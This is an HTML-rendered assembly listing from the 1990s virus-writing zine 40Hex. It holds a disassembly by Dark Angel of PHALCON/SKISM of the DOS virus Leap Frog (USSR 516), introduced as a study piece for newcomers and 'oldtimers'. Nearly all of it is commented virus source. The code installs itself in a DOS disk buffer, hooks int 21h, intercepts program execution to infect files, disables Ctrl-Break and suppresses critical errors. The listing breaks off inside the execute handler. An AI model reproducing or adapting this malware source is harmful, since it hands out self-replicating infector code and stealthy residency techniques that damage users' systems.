<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>leapfrog.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; 40Hex Number 7 Volume 2 Issue 3                                     File 006</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                          Virus Spotlite on: Leap Frog</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; It's always interesting to find new residency techniques.  I suppose everyone</span><span class="sc0">
</span><span class="sc1">; by now is tired of the traditional high-memory loading routine and is on the</span><span class="sc0">
</span><span class="sc1">; lookout for something different.  40Hex comes to the rescue!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; This virus, the "Leap Frog" or USSR 516, has one of the most unique methods</span><span class="sc0">
</span><span class="sc1">; I have ever seen.  I was mucking around in VSUM and noticed that it, according</span><span class="sc0">
</span><span class="sc1">; to Patricia, it "installs itself in a hole in memory between MSDOS and the DOS</span><span class="sc0">
</span><span class="sc1">; Stacks."  She is, of course, not telling us the entire story.  Leap Frog</span><span class="sc0">
</span><span class="sc1">; basically latches onto and resides in a DOS disk buffer.  I do not know who</span><span class="sc0">
</span><span class="sc1">; the author is, but I commend him for his innovative technique.  I took the</span><span class="sc0">
</span><span class="sc1">; liberty of disassembling the virus which is given below.  It should be an</span><span class="sc0">
</span><span class="sc1">; exact byte-for-byte matchup of the original carrier file (or at least should</span><span class="sc0">
</span><span class="sc1">; be extremely similar).  The offsets are in their correct locations, etc, etc.</span><span class="sc0">
</span><span class="sc1">; It is simple to understand and terribly efficient.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Although the coding is tight, there are some inconsistencies.  For</span><span class="sc0">
</span><span class="sc1">; example, I do not understand the purpose of the timing routine(int 21h/ah=30h)</span><span class="sc0">
</span><span class="sc1">; in the code.  I also do not understand why the author decided to infect COM</span><span class="sc0">
</span><span class="sc1">; files in such an abnormal way.  An interesting "feature" is the disabling of</span><span class="sc0">
</span><span class="sc1">; Control-Break checking - a thoroughly unnecessary piece of code.  I believe</span><span class="sc0">
</span><span class="sc1">; further that the line above "findmarker" should read:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                 lds     di,dword ptr ds:[30h*4]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; In any case, the code is otherwise very, very good.  It is great for studying</span><span class="sc0">
</span><span class="sc1">; by newcomers and "oldtimers" alike.  Things to look for:</span><span class="sc0">
</span><span class="sc1">;   Residency routine</span><span class="sc0">
</span><span class="sc1">;   Lack of extensive use of relative offsets</span><span class="sc0">
</span><span class="sc1">;   Use of stack frame in the interrupt handler</span><span class="sc0">
</span><span class="sc1">;   Critical error handler</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Enjoy!                                           Dark Angel of PHALCON/SKISM</span><span class="sc0">

</span><span class="sc5">ussr516</span><span class="sc0">         </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ussr516</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ussr516</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc1">;Disassembled by Dark Angel of PHALCON/SKISM</span><span class="sc0">
</span><span class="sc1">;for 40Hex Number 7 Volume 2 Issue 3</span><span class="sc0">
</span><span class="sc5">stub</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;This is where the virus really begins</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">beginvir</span><span class="sc0">

</span><span class="sc5">orig4</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int30store</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;Actually it's int 21h</span><span class="sc0">
                                                       </span><span class="sc1">;entry point</span><span class="sc0">
</span><span class="sc5">int21store</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">beginvir</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                             </span><span class="sc1">;BP -&gt; orig4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">103h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;DI -&gt; orig4</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;restore original</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;4 bytes of program</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;int21store</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">30h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Bug????</span><span class="sc0">
</span><span class="sc5">findmarker</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0E18Ah</span><span class="sc0">         </span><span class="sc1">;Find marker bytes</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">findmarker</span><span class="sc0">                     </span><span class="sc1">;to the entry point</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;and move to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;int30store</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5252h</span><span class="sc0">                       </span><span class="sc1">;Get list of lists</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                            </span><span class="sc1">;and also ID check</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                         </span><span class="sc1">;Already installed?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">quitvir</span><span class="sc0">                        </span><span class="sc1">;then exit</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                         </span><span class="sc1">;Get DOS version</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                             </span><span class="sc1">;bx = 12, ptr to 1st</span><span class="sc0">
                                                       </span><span class="sc1">;disk buffer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">handlebuffer</span><span class="sc0">                   </span><span class="sc1">;if DOS 3</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">handleDBHCH</span><span class="sc0">                    </span><span class="sc1">;if &gt; DOS 3</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                             </span><span class="sc1">;DOS 2.X, offset is 13</span><span class="sc0">
</span><span class="sc5">handlebuffer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Get seg:off of buffer</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                             </span><span class="sc1">;ES:DI-&gt;seg:off buff</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;ptr to next buffer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">                      </span><span class="sc1">;least recently used?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">handlebuffer</span><span class="sc0">                   </span><span class="sc1">;if not, go find it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">quitvir</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">movetobuffer</span><span class="sc0">
</span><span class="sc5">handleDBHCH</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Disk Buffer Hash Chain Head array</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;ptr to disk buffer</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                                  </span><span class="sc1">;info</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                                  </span><span class="sc1">;seg of disk buffer</span><span class="sc0">
                                                       </span><span class="sc1">;hash chain head array</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                             </span><span class="sc1">;second entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                                  </span><span class="sc1">;EMS page, -1 if not</span><span class="sc0">
                                                       </span><span class="sc1">;in EMS</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;save in di</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                                  </span><span class="sc1">;ptr to least recently</span><span class="sc0">
                                                       </span><span class="sc1">;used buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;change disk buffer</span><span class="sc0">
                                                       </span><span class="sc1">;backward offset to</span><span class="sc0">
                                                       </span><span class="sc1">;least recently used</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;restore EMS page</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">;set to least recently</span><span class="sc0">
</span><span class="sc5">movetobuffer</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;used</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                             </span><span class="sc1">;ES:DI -&gt; disk buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">108h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;Copy from start</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;DS -&gt; interrupt table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">21h</span><span class="sc4">],</span><span class="sc2">0BCh</span><span class="sc0">       </span><span class="sc1">;New interrupt handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">;at int21</span><span class="sc0">
</span><span class="sc5">quitvir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                             </span><span class="sc1">;CS = DS = ES</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                       </span><span class="sc1">;set up stack for</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                             </span><span class="sc1">;the return to the</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                                   </span><span class="sc1">;original program</span><span class="sc0">
</span><span class="sc5">int24</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">;Ignore all errors</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">tickstore</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">                              </span><span class="sc1">;Why???</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">                                    </span><span class="sc1">;CP/M style call entry</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int30store</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                                   </span><span class="sc1">;point of int 21h</span><span class="sc0">

</span><span class="sc5">int21DSDX</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;For int 21h calls</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                             </span><span class="sc1">;with</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;DS:DX -&gt; filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">                       </span><span class="sc1">;Execute</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Execute</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5252h</span><span class="sc0">                       </span><span class="sc1">;ID check</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CheckID</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                         </span><span class="sc1">;DOS Version</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">DosVersion</span><span class="sc0">
</span><span class="sc5">callorig21</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;Do other calls</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21store</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DosVersion</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Why?????                              ;DOS Version</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tickstore</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">callorig21</span><span class="sc0">                     </span><span class="sc1">;Continue if not 0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">46Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; 40h:6Ch = Timer ticks</span><span class="sc0">
                                                       </span><span class="sc1">; since midnight</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                           </span><span class="sc1">; MOD 15</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tickstore</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;# 2-17</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">CheckID</span><span class="sc4">:</span><span class="sc0">                                               </span><span class="sc1">;ID Check</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0FFEEh</span><span class="sc0">                      </span><span class="sc1">;FFEEh = -12h</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">Execute</span><span class="sc4">:</span><span class="sc0">                                               </span><span class="sc1">;Execute</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                             </span><span class="sc1">;Save registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                             </span><span class="sc1">;DS:DX -&gt; filename</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                             </span><span class="sc1">;save it on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                          </span><span class="sc1">;Set up stack frame</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">                         </span><span class="sc1">;Temporary variables</span><span class="sc0">
                                                       </span><span class="sc1">;[bp-A] = attributes</span><span class="sc0">
                                                       </span><span class="sc1">;[bp-8] = int 24 off</span><span class="sc0">
                                                       </span><span class="sc1">;[bp-6] = int 24 seg</span><span class="sc0">
                                                       </span><span class="sc1">;[bp-4] = file time</span><span class="sc0">
                                                       </span><span class="sc1">;[bp-2] = file date</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3301h</span><span class="sc0">                       </span><span class="sc1">;Turn off ^C check</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                          </span><span class="sc1">;(never turn it back</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                          </span><span class="sc1">; on.  Bug???)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                       </span><span class="sc1">;Get int 24h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">                          </span><span class="sc1">;(Critical error)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
